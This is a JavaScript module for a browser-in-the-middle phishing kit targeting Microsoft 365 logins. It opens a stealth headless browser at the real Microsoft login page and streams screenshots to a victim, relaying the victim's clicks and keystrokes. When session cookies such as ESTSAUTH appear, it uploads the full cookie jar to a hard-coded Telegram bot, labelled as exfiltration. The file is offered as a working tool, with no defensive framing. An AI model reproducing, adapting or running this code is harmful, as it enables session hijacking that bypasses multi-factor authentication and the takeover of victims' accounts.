const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

const TELEGRAM_TOKEN = '8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc';
const CHAT_ID = '1318100118';

const VIEWPORT_WIDTH = 1280;
const VIEWPORT_HEIGHT = 720;

async function sendExfiltrationAlert(cookies, finalUrl) {
    const docUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;
    const msgUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    try {
        const host = new URL(finalUrl).hostname;
        const textAlert = `<b>✅ AUTHENTICATION CAPTURED</b>\n\n<b>Landing:</b> <code>${host}</code>\n<b>Cookie Count:</b> ${cookies.length}\n\n<i>Note: Session tokens validated.</i>`;
        
        await axios.post(msgUrl, {
            chat_id: CHAT_ID,
            text: textAlert,
            parse_mode: 'HTML'
        });

        const cookieData = JSON.stringify(cookies, null, 2);
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('caption', `Validated Jar: ${host}`);
        form.append('document', Buffer.from(cookieData, 'utf-8'), {
            filename: `SESSION_${Date.now()}.json`,
            contentType: 'application/json'
        });

        await axios.post(docUrl, form, { headers: form.getHeaders() });
        console.log("[TELEGRAM] Data exfiltrated.");
    } catch (e) {
        console.error('[EXFIL-ERR]', e.message);
    }
}

async function startSession(io, socket) {
    let browser;
    let hasExfiltrated = false;

    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: ['--no-sandbox', '--disable-setuid-sandbox', `--window-size=${VIEWPORT_WIDTH},${VIEWPORT_HEIGHT}`]
        });

        const page = await browser.newPage();
        await page.setViewport({ width: VIEWPORT_WIDTH, height: VIEWPORT_HEIGHT });
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');

        const emitFrame = async () => {
            if (socket.connected) {
                try {
                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 20 });
                    socket.emit('browser-render', { screenshot });
                } catch (e) {}
            }
        };

        await page.goto('https://login.microsoftonline.com/', { waitUntil: 'networkidle2' }).catch(() => {});
        const heartbeat = setInterval(emitFrame, 1200);

        page.on('framenavigated', async (frame) => {
            if (hasExfiltrated) return;

            const url = frame.url().toLowerCase();
            
            // Check for Dashboard URLs
            const isDashboard = url.includes('office.com') || 
                                url.includes('outlook.live.com') || 
                                url.includes('microsoft365.com');

            // Always ignore the initial auth redirect to prevent early-fire
            if (url.includes('/oauth20_authorize.srf')) return;

            // CHECK COOKIES ON EVERY NAVIGATION AFTER LOGIN STARTS
            const cookies = await page.cookies();
            const hasAuthTokens = cookies.some(c => 
                c.name.includes('ESTSAUTH') || 
                c.name.includes('RPSSecAuth') || 
                c.name.includes('__Host-MSAAUTH')
            );

            // TRIGGER: Either we hit the dashboard OR we have the tokens and are past the main login screen
            if (hasAuthTokens && (isDashboard || url.includes('kmsi') || url.includes('shell/homepage'))) {
                hasExfiltrated = true;
                console.log(`[SUCCESS] Tokens detected at ${url}. Sending...`);
                
                // Final 3-second wait to ensure persistence cookies are written
                await new Promise(r => setTimeout(r, 3000));
                const finalCookies = await page.cookies();
                await sendExfiltrationAlert(finalCookies, url);
            }
        });

        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') {
                    await page.mouse.click(data.x, data.y, { delay: 50 });
                } else if (data.type === 'key') {
                    await page.keyboard.press(data.key);
                }
                await emitFrame();
            } catch (e) {}
        });

        socket.on('disconnect', async () => {
            clearInterval(heartbeat);
            if (browser) await browser.close();
        });

    } catch (error) {
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
